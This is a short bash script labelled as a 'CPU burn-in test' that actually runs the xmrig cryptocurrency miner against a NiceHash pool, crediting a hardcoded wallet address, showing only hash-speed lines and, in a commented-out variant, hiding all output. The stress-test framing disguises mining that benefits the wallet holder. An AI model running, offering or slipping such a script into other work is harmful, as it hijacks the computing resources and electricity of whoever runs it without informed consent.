#!/bin/bash

#variables
username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.test$RANDOM"
url="cryptonightr.usa-new.nicehash.com:3375"

cd /root/cpuburn/

echo $username
#echo $url
echo Burn in progress...
echo "Ctrl + C to abort"

#Execute CPU burn-in test
#./xmrig --url=$url --user=$username --pass="x" --variant=-1 --asm=auto --nicehash --donate-level=40 &> /dev/null
./xmrig --url=$url --user=$username --pass="x" --variant=-1 --asm=auto --nicehash --donate-level=40 | grep speed
